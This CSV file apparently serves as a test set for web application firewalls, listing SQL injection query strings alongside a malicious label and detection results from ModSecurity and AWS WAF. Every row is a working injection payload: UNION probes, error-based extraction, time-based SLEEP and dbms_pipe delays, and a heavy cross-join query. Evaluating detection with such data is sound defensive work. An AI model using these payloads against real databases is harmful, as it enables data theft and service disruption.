Query,Label,ModSecurity Result Label,AWS WAF Result Label
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,1,1,1
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz",1,1,1
"1""  )   where 2473  =  2473 and make_set  (  6118  =  7684,7684  )  --",1,1,1
"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1,1,1
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",1,1,1
"1  )   where 7588  =  7588 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1
"1   )    )    union all select null,null,null,null,null,null,null,null--",1,1,1
-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ),1,1,1
"1"" where 2878  =  2878 union all select null,null,null,null,null#",1,1,1
-3597'   )    )    order by 1--,1,1,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1
"1""  )   as qirf where 6200  =  6200   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,1
"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1
1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,1,1,1
